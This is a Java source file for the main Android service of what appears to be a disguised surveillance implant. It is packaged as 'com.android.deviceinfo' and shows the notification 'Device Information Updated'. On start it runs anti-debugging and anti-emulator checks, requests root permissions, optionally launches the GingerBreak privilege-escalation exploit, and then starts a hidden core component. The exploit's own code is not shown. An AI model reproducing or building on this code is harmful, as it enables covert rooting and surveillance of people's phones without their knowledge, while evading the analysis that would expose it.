package com.android.deviceinfo;

import java.io.IOException;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.res.Configuration;
import android.os.IBinder;
import android.widget.Toast;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.capabilities.PackageInfo;
import com.android.deviceinfo.listener.AR;
import com.android.deviceinfo.util.Check;

/**
 * The Class ServiceCore.
 */
public class ServiceMain extends Service {
	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
	private boolean needsNotification = false;
	private Core core;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();

		Status.setAppContext(getApplicationContext());
		
		// ANTIDEBUG ANTIEMU
		if (!Core.checkStatic()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onCreate) anti emu/debug failed");
			}
			return;
		}

		Messages.init(getApplicationContext());

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("32_1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}

		// TODO: verificare che needsNotification serva.
		needsNotification = false; // Root.isNotificationNeeded();

		// E' sempre false se Cfg.ACTIVITY = false
		if (needsNotification == true) {
			Notification note = new Notification(R.drawable.notify_icon, "Device Information Updated",
					System.currentTimeMillis());

			Intent i = new Intent(this, LocalActivity.class);

			i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);

			PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);

			// Activity Name and Displayed Text
			note.flags |= Notification.FLAG_AUTO_CANCEL;
			note.setLatestEventInfo(this, "", "", pi);

			startForeground(1260, note);
		}
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
		}

		// ANTIDEBUG ANTIEMU
		if (Core.checkStatic()) {

			Root root = new Root();
			root.getPermissions();

			if (Cfg.EXP) {
				root.runGingerBreak();
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onStart) anti emu/debug failed");
			}
		}
		// Core starts
		core = Core.newCore(this);
		core.Start(this.getResources(), getContentResolver());
	}

	@Override
	public void onConfigurationChanged(Configuration newConfig) {
		super.onConfigurationChanged(newConfig);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onConfigurationChanged)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("36_3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public void onLowMemory() {
		super.onLowMemory();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onLowMemory)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("36_4"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public void onRebind(Intent intent) {
		super.onRebind(intent);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onRebind)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("36_5"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public boolean onUnbind(Intent intent) {
		boolean ret = super.onUnbind(intent);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onUnbind)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("36_6"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}

		return ret;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("32_3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}

		core.Stop();
		core = null;

		if (needsNotification == true) {
			stopForeground(true);
		}
	}

}